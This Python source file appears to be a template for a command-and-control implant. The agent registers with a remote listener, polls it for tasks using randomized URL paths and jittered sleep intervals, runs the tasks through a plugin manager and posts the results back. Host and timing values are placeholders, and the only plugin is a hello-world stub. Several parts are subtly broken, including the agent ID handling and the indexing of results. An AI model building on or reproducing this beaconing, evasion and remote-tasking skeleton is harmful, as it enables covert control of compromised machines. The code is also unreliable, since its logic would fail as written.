import json
import random
import time
import urllib.error
import urllib.request

REMOTE_HOST = "REMOTE_HOST"
REMOTE_PORT = "REMOTE_PORT"
SLEEP_TIME = "SLEEP_TIME"
SLEEP_TIME_JITTER = "SLEEP_TIME_JITTER"
TASKS_URL_PATHS = "TASKS_URL_PATHS"
RESULTS_URL_PATHS = "RESULTS_URL_PATHS"
REGISTRATION_URL_PATHS = "REGISTRATION_URL_PATHS"


class PluginManager:
    def __init__(self):
        self._plugins = {
            "hello_world": lambda _: "Hello, World!",
        }

    def run_plugin(self, task):
        return self._plugins[task["command"]](task["arguments"])

    def load_plugin(self): ...

    def unload_plugin(self): ...


class Agent:
    def __init__(
        self,
        remote_host,
        remote_port,
        sleep_time,
        sleep_time_jitter,
        tasks_url_paths,
        results_url_paths,
        registration_url_paths,
    ):
        self._remote_host = remote_host
        self._remote_port = remote_port
        self._sleep_time = sleep_time
        self._sleep_time_jitter = sleep_time_jitter
        self._tasks_url_paths = tasks_url_paths
        self._results_url_paths = results_url_paths
        self._registration_url_paths = registration_url_paths

        self._base_listener_url = f"http://{self._remote_host}:{self._remote_port}"
        self._plugin_manager = PluginManager()

    def _register_with_listener(self):
        return urllib.request.urlopen(
            f"{self._base_listener_url}{random.choice(self._registration_url_paths)}",
        )

    def _get_tasks_from_listener(self):
        response = urllib.request.urlopen(
            f"{self._base_listener_url}{random.choice(self._tasks_url_paths)}",
        )
        tasks = json.loads(response.read().decode())
        return tasks

    def _post_results_to_listener(self, results):
        data = json.dumps(results).encode()
        req = urllib.request.Request(
            f"{self._base_listener_url}{random.choice(self._results_url_paths)}",
            data=data,
            method="POST",
        )
        urllib.request.urlopen(req)

    def run_agent(self):
        while True:
            try:
                agent_id = self._register_with_listener()
                break
            except urllib.error.URLError:
                jitter = self._sleep_time * (
                    1
                    + (
                        random.random() * 2 * self._sleep_time_jitter / 100
                        - self._sleep_time_jitter / 100
                    )
                )
                time.sleep(jitter)
                continue

        while True:
            tasks = self._get_tasks_from_listener()
            results = []

            for task in tasks:
                result = self._plugin_manager.run_plugin(task)
                result["agent_id"] = agent_id
                results.append(result)

            self._post_results_to_listener(results)

            jitter = self._sleep_time * (
                1
                + (
                    random.random() * 2 * self._sleep_time_jitter / 100
                    - self._sleep_time_jitter / 100
                )
            )
            time.sleep(jitter)


def main():
    agent = Agent(
        remote_host=REMOTE_HOST,
        remote_port=REMOTE_PORT,
        sleep_time=SLEEP_TIME,
        sleep_time_jitter=SLEEP_TIME_JITTER,
        tasks_url_paths=TASKS_URL_PATHS,
        results_url_paths=RESULTS_URL_PATHS,
        registration_url_paths=REGISTRATION_URL_PATHS,
    )
    agent.run_agent()


if __name__ == "__main__":
    main()
